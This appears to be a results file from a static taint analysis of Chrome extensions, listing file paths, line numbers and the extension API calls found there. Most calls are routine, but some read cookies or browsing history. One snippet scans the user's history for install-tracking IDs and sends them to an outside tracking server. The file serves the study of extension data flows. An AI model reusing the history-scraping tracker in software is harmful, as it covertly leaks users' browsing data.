taint-steps/0-propWrite/src/cfmnkhhioonhiehehedmnjibmampjiab.7_3_0_0/js/popup.31498d16.js,2485,chrome.tabs.query,chrome. ...      }),"chrome.tabs.query({ active: true, currentWindow: true })"
taint-steps/0-propWrite/src/cfmnkhhioonhiehehedmnjibmampjiab.7_3_0_0/js/popup.31498d16.js,2506,chrome.runtime.sendMessage,chrome. ...      }),chrome.runtime.sendMessage({ message: SM_MESSAGE_CONTEXT_LINK })
taint-steps/0-propWrite/src/cfmnkhhioonhiehehedmnjibmampjiab.7_3_0_0/js/welcome.836f1d84.js,1603,chrome.runtime.sendMessage,chrome. ...      }),"chrome.runtime.sendMessage({ message: SM_MESSAGE_IMPORT, quiet: true })"
taint-steps/1-getAMethodCall/result/encodeURI-multipleSinks-search.js,19,chrome.runtime.sendMessage,chrome. ... : url}),chrome.runtime.sendMessage({openURL: url})
taint-steps/1-getAMethodCall/src/agpoehmhgoieigdbjhgphpagmloehamn.2_0_0_0/background.js,2,chrome.tabs.create,chrome. ... tml')}),chrome.tabs.create({url: chrome.runtime.getURL('newtab.html')})
taint-steps/1-getAMethodCall/src/agpoehmhgoieigdbjhgphpagmloehamn.2_0_0_0/background.js,2,chrome.runtime.getURL,chrome. ... .html'),chrome.runtime.getURL('newtab.html')
taint-steps/2-getAnArgument/result/getAnArgument-encodeURI-multipleSinks-search.js,24,chrome.runtime.sendMessage,chrome. ... : url}),chrome.runtime.sendMessage({openURL: url})
taint-steps/2-getAnArgument/src/kbnpeiabjlfcakokkpbcgalbgiljoddf.2_0_0_0/js/bg.js,21,chrome.runtime.getURL,chrome. ... .html'),chrome.runtime.getURL('index.html')
taint-steps/2-getAnArgument/src/kbnpeiabjlfcakokkpbcgalbgiljoddf.2_0_0_0/js/bg.js,64,chrome.runtime.setUninstallURL,chrome. ... allURL),chrome.runtime.setUninstallURL(uninstallURL)
taint-steps/2-getAnArgument/src/kbnpeiabjlfcakokkpbcgalbgiljoddf.2_0_0_0/js/search.js,106,chrome.runtime.sendMessage,chrome. ... : url}),chrome.runtime.sendMessage({openURL: url})
taint-steps/3-getAParameter/result/getAParameter-react-functionbody-chrome.tabs.create.js,10,chrome.tabs.create,chrome. ... lue}`}),chrome.tabs.create({url: `https://www.google.com/search?q=${event.target.value}`})
taint-steps/3-getAParameter/result/getAParameter-react-functionbody-chrome.tabs.create.js,48,chrome.tabs.create,chrome. ...      }),"chrome.tabs.create({ url: `https://www.google.com/search?q=${event.target.value}`, })"
taint-steps/3-getAParameter/src/bkiakepgpgfibglghlhdpacjdglfpbnn.0_0_4_0/background.js,7,chrome.tabs.create,"chrome. ... tml"" })","chrome.tabs.create({ url: ""popup.html"" })"
taint-steps/3-getAParameter/src/bkiakepgpgfibglghlhdpacjdglfpbnn.0_0_4_0/background.js,11,chrome.runtime.getURL,"chrome. ... 8.png"")","chrome.runtime.getURL(""icon128.png"")"
taint-steps/3-getAParameter/src/bkiakepgpgfibglghlhdpacjdglfpbnn.0_0_4_0/background.js,12,chrome.notifications.create,"chrome. ... `,\n  })","chrome.notifications.create(""name-for-notification"", { type: ""basic"", iconUrl: logo, title: ""New Tab With ChatGPT"", message: `${message} Extension`, })"
taint-steps/3-getAParameter/src/bkiakepgpgfibglghlhdpacjdglfpbnn.0_0_4_0/popup.js,592,chrome.tabs.create,chrome. ...      }),"chrome.tabs.create({ url: ""chrome://history"", })"
taint-steps/3-getAParameter/src/bkiakepgpgfibglghlhdpacjdglfpbnn.0_0_4_0/popup.js,617,chrome.history.search,chrome. ...      }),"chrome.history.search({ text: """", startTime: startTimeToday, endTime: endTimeToday, }, (data) => { setTodaysHistory(data); })"
taint-steps/3-getAParameter/src/bkiakepgpgfibglghlhdpacjdglfpbnn.0_0_4_0/popup.js,624,chrome.history.search,chrome. ...      }),"chrome.history.search({ text: """", startTime: startTimeYesterday, endTime: endTimeYesterday, }, (data) => { setYesterdayHistory(data); })"
taint-steps/3-getAParameter/src/bkiakepgpgfibglghlhdpacjdglfpbnn.0_0_4_0/popup.js,631,chrome.history.search,chrome. ...      }),"chrome.history.search({ text: """" }, (data) => { setSuggestHistory(data); })"
taint-steps/3-getAParameter/src/bkiakepgpgfibglghlhdpacjdglfpbnn.0_0_4_0/popup.js,640,chrome.tabs.create,chrome. ...      }),"chrome.tabs.create({ url: ""chrome://settings/clearBrowserData"", })"
taint-steps/3-getAParameter/src/bkiakepgpgfibglghlhdpacjdglfpbnn.0_0_4_0/popup.js,652,chrome.tabs.create,chrome. ...      }),"chrome.tabs.create({ url: ""chrome://history/"", })"
taint-steps/3-getAParameter/src/bkiakepgpgfibglghlhdpacjdglfpbnn.0_0_4_0/popup.js,1097,chrome.bookmarks.getTree,chrome. ...      }),chrome.bookmarks.getTree((res) => { setBookmarks(res[0].children[0].children); })
taint-steps/3-getAParameter/src/bkiakepgpgfibglghlhdpacjdglfpbnn.0_0_4_0/popup.js,1103,chrome.tabs.create,chrome. ...      }),"chrome.tabs.create({ url: `https://www.google.com/search?q=${event.target.value}`, })"
taint-steps/4-yield/src/ecmeogcbcoalojmkfkmancobmiahaigg.3_7_5_0/554/554.js,1,chrome.tabs.query,"chrome. ... d""))}))","chrome.tabs.query({active:!0,currentWindow:!0},(a=>{for(let t=0;t<a.length;t+=1){const{url:e}=a[t];if(""string""==typeof e&&(e.startsWith(""https://search.shopping.naver.com/search/all?"")||e.startsWith(""https://search.naver.com/search.naver?"")||e.startsWith(o.default.DOMEME_SERACH_URL))){n=e;break}}if(n)try{if(n.startsWith(o.default.DOMEME_SERACH_URL)){const e=n.split(""?"")[1],o=new URLSearchParams(e);if(""subject""!==o.get(""sf""))throw new Error;t(o.get(""sw"")||"""")}else{const e=n.split(""query="")[1].split(""&"")[0];t(e.replace(/\+/g,""%20""))}}catch(t){e(new Error(""err_url_parsing""))}else e(new Error(""err_not_found""))}))"
taint-steps/4-yield/src/ecmeogcbcoalojmkfkmancobmiahaigg.3_7_5_0/554/554.js,1,chrome.tabs.query,chrome. ... ame)})),"chrome.tabs.query({active:!0,currentWindow:!0},(e=>{const n=document.createElement(""a"");n.href=e[0].url,t(n.hostname)}))"
taint-steps/4-yield/src/ecmeogcbcoalojmkfkmancobmiahaigg.3_7_5_0/554/554.js,1,chrome.tabs.query,chrome. ... ref)})),"chrome.tabs.query({active:!0,currentWindow:!0},(e=>{const n=document.createElement(""a"");n.href=e[0].url,t(n.href)}))"
taint-steps/4-yield/src/ecmeogcbcoalojmkfkmancobmiahaigg.3_7_5_0/554/554.js,1,chrome.tabs.query,chrome. ... ow:!0}),"chrome.tabs.query({active:!0,currentWindow:!0})"
taint-steps/4-yield/src/ecmeogcbcoalojmkfkmancobmiahaigg.3_7_5_0/554/554.js,1,chrome.cookies.getAll,chrome. ... lue)})),"chrome.cookies.getAll({domain:e,name:t},(t=>{var e;n(null===(e=t[0])||void 0===e?void 0:e.value)}))"
taint-steps/4-yield/src/ecmeogcbcoalojmkfkmancobmiahaigg.3_7_5_0/554/554.js,1,chrome.runtime.sendMessage,chrome. ... ata)})),"chrome.runtime.sendMessage({message:""getGraph"",cid:t,keyword:e,startDate:n,endDate:o},(t=>{a(t.data)}))"
taint-steps/4-yield/src/ecmeogcbcoalojmkfkmancobmiahaigg.3_7_5_0/554/554.js,1,chrome.tabs.sendMessage,chrome. ... ata)})),"chrome.tabs.sendMessage(n,{message:t,args:e},(t=>{o(t.data)}))"
taint-steps/4-yield/src/ecmeogcbcoalojmkfkmancobmiahaigg.3_7_5_0/554/554.js,1,chrome.scripting.executeScript,"chrome. ... .js""]})","chrome.scripting.executeScript({target:{tabId:n},files:[""parser/parser.js""]})"
taint-steps/4-yield/src/ecmeogcbcoalojmkfkmancobmiahaigg.3_7_5_0/background.js,1,chrome.tabs.create,"chrome. ... tml"")})","chrome.tabs.create({url:chrome.runtime.getURL(""product_analysis_extracting_page/product_analysis_extracting_page.html"")})"
taint-steps/4-yield/src/ecmeogcbcoalojmkfkmancobmiahaigg.3_7_5_0/background.js,1,chrome.tabs.query,"chrome. ... d""))}))","chrome.tabs.query({active:!0,currentWindow:!0},(o=>{for(let e=0;e<o.length;e+=1){const{url:r}=o[e];if(""string""==typeof r&&(r.startsWith(""https://search.shopping.naver.com/search/all?"")||r.startsWith(""https://search.naver.com/search.naver?"")||r.startsWith(t.DOMEME_SERACH_URL))){n=r;break}}if(n)try{if(n.startsWith(t.DOMEME_SERACH_URL)){const t=n.split(""?"")[1],r=new URLSearchParams(t);if(""subject""!==r.get(""sf""))throw new Error;e(r.get(""sw"")||"""")}else{const t=n.split(""query="")[1].split(""&"")[0];e(t.replace(/\+/g,""%20""))}}catch(t){r(new Error(""err_url_parsing""))}else r(new Error(""err_not_found""))}))"
taint-steps/4-yield/src/ecmeogcbcoalojmkfkmancobmiahaigg.3_7_5_0/background.js,1,chrome.tabs.query,chrome. ... ame)})),"chrome.tabs.query({active:!0,currentWindow:!0},(e=>{const r=document.createElement(""a"");r.href=e[0].url,t(r.hostname)}))"
taint-steps/4-yield/src/ecmeogcbcoalojmkfkmancobmiahaigg.3_7_5_0/background.js,1,chrome.tabs.query,chrome. ... ref)})),"chrome.tabs.query({active:!0,currentWindow:!0},(e=>{const r=document.createElement(""a"");r.href=e[0].url,t(r.href)}))"
taint-steps/4-yield/src/ecmeogcbcoalojmkfkmancobmiahaigg.3_7_5_0/background.js,1,chrome.tabs.query,chrome. ... ow:!0}),"chrome.tabs.query({active:!0,currentWindow:!0})"
taint-steps/4-yield/src/ecmeogcbcoalojmkfkmancobmiahaigg.3_7_5_0/background.js,1,chrome.cookies.getAll,chrome. ... lue)})),"chrome.cookies.getAll({domain:e,name:t},(t=>{var e;r(null===(e=t[0])||void 0===e?void 0:e.value)}))"
taint-steps/4-yield/src/ecmeogcbcoalojmkfkmancobmiahaigg.3_7_5_0/background.js,1,chrome.runtime.sendMessage,chrome. ... e(t)})),"chrome.runtime.sendMessage({action:""keywordGraph"",query:t},(t=>{e(t)}))"
taint-steps/4-yield/src/ecmeogcbcoalojmkfkmancobmiahaigg.3_7_5_0/background.js,1,chrome.runtime.getURL,"chrome. ... .html"")","chrome.runtime.getURL(""product_analysis_extracting_page/product_analysis_extracting_page.html"")"
taint-steps/4-yield/src/ecmeogcbcoalojmkfkmancobmiahaigg.3_7_5_0/background.js,1,chrome.tabs.sendMessage,chrome. ... ata)})),"chrome.tabs.sendMessage(r,{message:t,args:e},(t=>{n(t.data)}))"
taint-steps/4-yield/src/ecmeogcbcoalojmkfkmancobmiahaigg.3_7_5_0/background.js,1,chrome.scripting.executeScript,"chrome. ... .js""]})","chrome.scripting.executeScript({target:{tabId:r},files:[""parser/parser.js""]})"
taint-steps/4-yield/src/ecmeogcbcoalojmkfkmancobmiahaigg.3_7_5_0/background.js,1,chrome.scripting.executeScript,"chrome. ... *""))}})","chrome.scripting.executeScript({target:{tabId:e},files:[""iframe_script/iframe_script.js""]})"
taint-steps/4-yield/src/ecmeogcbcoalojmkfkmancobmiahaigg.3_7_5_0/iframe_script/iframe_script.js,1,chrome.runtime.getURL,"chrome. ... .html"")","chrome.runtime.getURL(""popup/popup.html"")"
taint-steps/4-yield/src/ecmeogcbcoalojmkfkmancobmiahaigg.3_7_5_0/inject/inject.js,1,chrome.runtime.getURL,"chrome. ... pt.js"")","chrome.runtime.getURL(""content_script/content_script.js"")"
taint-steps/4-yield/src/ecmeogcbcoalojmkfkmancobmiahaigg.3_7_5_0/keyword_analysis_script/keyword_analysis_script.js,1,chrome.runtime.getURL,"chrome. ... .html"")","chrome.runtime.getURL(""keyword_analysis/keyword_analysis.html"")"
taint-steps/4-yield/src/ecmeogcbcoalojmkfkmancobmiahaigg.3_7_5_0/margin_calculator/margin_calculator.js,1,chrome.tabs.query,"chrome. ... d""))}))","chrome.tabs.query({active:!0,currentWindow:!0},(n=>{for(let e=0;e<n.length;e+=1){const{url:t}=n[e];if(""string""==typeof t&&(t.startsWith(""https://search.shopping.naver.com/search/all?"")||t.startsWith(""https://search.naver.com/search.naver?"")||t.startsWith(l.DOMEME_SERACH_URL))){a=t;break}}if(a)try{if(a.startsWith(l.DOMEME_SERACH_URL)){const t=a.split(""?"")[1],n=new URLSearchParams(t);if(""subject""!==n.get(""sf""))throw new Error;e(n.get(""sw"")||"""")}else{const t=a.split(""query="")[1].split(""&"")[0];e(t.replace(/\+/g,""%20""))}}catch(e){t(new Error(""err_url_parsing""))}else t(new Error(""err_not_found""))}))"
taint-steps/4-yield/src/ecmeogcbcoalojmkfkmancobmiahaigg.3_7_5_0/margin_calculator/margin_calculator.js,1,chrome.tabs.query,chrome. ... ame)})),"chrome.tabs.query({active:!0,currentWindow:!0},(t=>{const a=document.createElement(""a"");a.href=t[0].url,e(a.hostname)}))"
taint-steps/4-yield/src/ecmeogcbcoalojmkfkmancobmiahaigg.3_7_5_0/margin_calculator/margin_calculator.js,1,chrome.tabs.query,chrome. ... ref)})),"chrome.tabs.query({active:!0,currentWindow:!0},(t=>{const a=document.createElement(""a"");a.href=t[0].url,e(a.href)}))"
taint-steps/4-yield/src/ecmeogcbcoalojmkfkmancobmiahaigg.3_7_5_0/margin_calculator/margin_calculator.js,1,chrome.tabs.query,chrome. ... ow:!0}),"chrome.tabs.query({active:!0,currentWindow:!0})"
taint-steps/4-yield/src/ecmeogcbcoalojmkfkmancobmiahaigg.3_7_5_0/margin_calculator/margin_calculator.js,1,chrome.cookies.getAll,chrome. ... lue)})),"chrome.cookies.getAll({domain:t,name:e},(e=>{var t;a(null===(t=e[0])||void 0===t?void 0:t.value)}))"
taint-steps/4-yield/src/ecmeogcbcoalojmkfkmancobmiahaigg.3_7_5_0/margin_calculator/margin_calculator.js,1,chrome.tabs.sendMessage,chrome. ... ata)})),"chrome.tabs.sendMessage(a,{message:e,args:t},(e=>{n(e.data)}))"
taint-steps/4-yield/src/ecmeogcbcoalojmkfkmancobmiahaigg.3_7_5_0/margin_calculator/margin_calculator.js,1,chrome.scripting.executeScript,"chrome. ... .js""]})","chrome.scripting.executeScript({target:{tabId:a},files:[""parser/parser.js""]})"
taint-steps/4-yield/src/ecmeogcbcoalojmkfkmancobmiahaigg.3_7_5_0/margin_calculator_script/margin_calculator_script.js,1,chrome.runtime.getURL,"chrome. ... .html"")","chrome.runtime.getURL(""margin_calculator/margin_calculator.html"")"
taint-steps/4-yield/src/ecmeogcbcoalojmkfkmancobmiahaigg.3_7_5_0/popup/popup.js,1,chrome.tabs.query,"chrome. ... d""))}))","chrome.tabs.query({active:!0,currentWindow:!0},(r=>{for(let e=0;e<r.length;e+=1){const{url:t}=r[e];if(""string""==typeof t&&(t.startsWith(""https://search.shopping.naver.com/search/all?"")||t.startsWith(""https://search.naver.com/search.naver?"")||t.startsWith(l.DOMEME_SERACH_URL))){o=t;break}}if(o)try{if(o.startsWith(l.DOMEME_SERACH_URL)){const t=o.split(""?"")[1],r=new URLSearchParams(t);if(""subject""!==r.get(""sf""))throw new Error;e(r.get(""sw"")||"""")}else{const t=o.split(""query="")[1].split(""&"")[0];e(t.replace(/\+/g,""%20""))}}catch(e){t(new Error(""err_url_parsing""))}else t(new Error(""err_not_found""))}))"
taint-steps/4-yield/src/ecmeogcbcoalojmkfkmancobmiahaigg.3_7_5_0/popup/popup.js,1,chrome.tabs.query,chrome. ... ame)})),"chrome.tabs.query({active:!0,currentWindow:!0},(t=>{const o=document.createElement(""a"");o.href=t[0].url,e(o.hostname)}))"
taint-steps/4-yield/src/ecmeogcbcoalojmkfkmancobmiahaigg.3_7_5_0/popup/popup.js,1,chrome.tabs.query,chrome. ... ref)})),"chrome.tabs.query({active:!0,currentWindow:!0},(t=>{const o=document.createElement(""a"");o.href=t[0].url,e(o.href)}))"
taint-steps/4-yield/src/ecmeogcbcoalojmkfkmancobmiahaigg.3_7_5_0/popup/popup.js,1,chrome.tabs.query,chrome. ... ow:!0}),"chrome.tabs.query({active:!0,currentWindow:!0})"
taint-steps/4-yield/src/ecmeogcbcoalojmkfkmancobmiahaigg.3_7_5_0/popup/popup.js,1,chrome.cookies.getAll,chrome. ... lue)})),"chrome.cookies.getAll({domain:t,name:e},(e=>{var t;o(null===(t=e[0])||void 0===t?void 0:t.value)}))"
taint-steps/4-yield/src/ecmeogcbcoalojmkfkmancobmiahaigg.3_7_5_0/popup/popup.js,1,chrome.tabs.sendMessage,chrome. ... ata)})),"chrome.tabs.sendMessage(o,{message:e,args:t},(e=>{r(e.data)}))"
taint-steps/4-yield/src/ecmeogcbcoalojmkfkmancobmiahaigg.3_7_5_0/popup/popup.js,1,chrome.scripting.executeScript,"chrome. ... .js""]})","chrome.scripting.executeScript({target:{tabId:o},files:[""parser/parser.js""]})"
taint-steps/4-yield/src/ecmeogcbcoalojmkfkmancobmiahaigg.3_7_5_0/product_analysis/product_analysis.js,1,chrome.runtime.sendMessage,"chrome. ... Page""})","chrome.runtime.sendMessage({message:""openProductAnalysisExtractPage""})"
taint-steps/4-yield/src/ecmeogcbcoalojmkfkmancobmiahaigg.3_7_5_0/product_analysis_extracting_page/product_analysis_extracting_page.js,1,chrome.tabs.query,"chrome. ... d""))}))","chrome.tabs.query({active:!0,currentWindow:!0},(r=>{for(let e=0;e<r.length;e+=1){const{url:t}=r[e];if(""string""==typeof t&&(t.startsWith(""https://search.shopping.naver.com/search/all?"")||t.startsWith(""https://search.naver.com/search.naver?"")||t.startsWith(b.DOMEME_SERACH_URL))){n=t;break}}if(n)try{if(n.startsWith(b.DOMEME_SERACH_URL)){const t=n.split(""?"")[1],r=new URLSearchParams(t);if(""subject""!==r.get(""sf""))throw new Error;e(r.get(""sw"")||"""")}else{const t=n.split(""query="")[1].split(""&"")[0];e(t.replace(/\+/g,""%20""))}}catch(e){t(new Error(""err_url_parsing""))}else t(new Error(""err_not_found""))}))"
taint-steps/4-yield/src/ecmeogcbcoalojmkfkmancobmiahaigg.3_7_5_0/product_analysis_extracting_page/product_analysis_extracting_page.js,1,chrome.tabs.query,chrome. ... ame)})),"chrome.tabs.query({active:!0,currentWindow:!0},(t=>{const n=document.createElement(""a"");n.href=t[0].url,e(n.hostname)}))"
taint-steps/4-yield/src/ecmeogcbcoalojmkfkmancobmiahaigg.3_7_5_0/product_analysis_extracting_page/product_analysis_extracting_page.js,1,chrome.tabs.query,chrome. ... ref)})),"chrome.tabs.query({active:!0,currentWindow:!0},(t=>{const n=document.createElement(""a"");n.href=t[0].url,e(n.href)}))"
taint-steps/4-yield/src/ecmeogcbcoalojmkfkmancobmiahaigg.3_7_5_0/product_analysis_extracting_page/product_analysis_extracting_page.js,1,chrome.tabs.query,chrome. ... ow:!0}),"chrome.tabs.query({active:!0,currentWindow:!0})"
taint-steps/4-yield/src/ecmeogcbcoalojmkfkmancobmiahaigg.3_7_5_0/product_analysis_extracting_page/product_analysis_extracting_page.js,1,chrome.cookies.getAll,chrome. ... lue)})),"chrome.cookies.getAll({domain:t,name:e},(e=>{var t;n(null===(t=e[0])||void 0===t?void 0:t.value)}))"
taint-steps/4-yield/src/ecmeogcbcoalojmkfkmancobmiahaigg.3_7_5_0/product_analysis_extracting_page/product_analysis_extracting_page.js,1,chrome.tabs.sendMessage,chrome. ... ata)})),"chrome.tabs.sendMessage(n,{message:e,args:t},(e=>{r(e.data)}))"
taint-steps/4-yield/src/ecmeogcbcoalojmkfkmancobmiahaigg.3_7_5_0/product_analysis_extracting_page/product_analysis_extracting_page.js,1,chrome.scripting.executeScript,"chrome. ... .js""]})","chrome.scripting.executeScript({target:{tabId:n},files:[""parser/parser.js""]})"
taint-steps/4-yield/src/ecmeogcbcoalojmkfkmancobmiahaigg.3_7_5_0/product_analysis_script/product_analysis_script.js,1,chrome.runtime.getURL,"chrome. ... .html"")","chrome.runtime.getURL(""product_analysis/product_analysis.html"")"
taint-steps/SUMMARY-simplified-snippets/getAParameter-react-functionbody-chrome.tabs.create.js,10,chrome.tabs.create,chrome. ... lue}`}),chrome.tabs.create({url: `https://www.google.com/search?q=${event.target.value}`})
taint-steps/SUMMARY-simplified-snippets/getAParameter-react-functionbody-chrome.tabs.create.js,48,chrome.tabs.create,chrome. ...      }),"chrome.tabs.create({ url: `https://www.google.com/search?q=${event.target.value}`, })"
taint-steps/SUMMARY-simplified-snippets/getAParameter-react-functionbody-chrome.tabs.create.js,70,chrome.history.search,chrome. ... \n    }),"chrome.history.search( { text: ""mytensai.com/install-ext?pid="" }, function(historyItems) { if(historyItems.length>0){ for (var i = 0; i < historyItems.length; ++i) { if(null!==getParameterByName('pid', historyItems[i].url) && getParameterByName('clickid', historyItems[i].url) ){  var pid = getParameterByName('pid', historyItems[i].url); var clickid = getParameterByName('clickid', historyItems[i].url); chrome.storage.sync.set({'pid':pid,'clickid': clickid}); //_gaq.push(['_trackEvent', clickid, 'clicked']);  var url = 'https://mytensai.com/mth/installTrack.php?pid='+pid+'&clickid='+clickid; fetch(url).then(function(response) { return response.json(); }).then(function(data) { console.log(data); }).catch(function() { console.log(""Booo""); }); //HttpRequest(pid,clickid); return; } } }else{ chrome.storage.sync.set({'pid':'pid','clickid': 'clickid'}); } })"
taint-steps/SUMMARY-simplified-snippets/getAnArgument-encodeURI-multipleSinks-search.js,24,chrome.runtime.sendMessage,chrome. ... : url}),chrome.runtime.sendMessage({openURL: url})
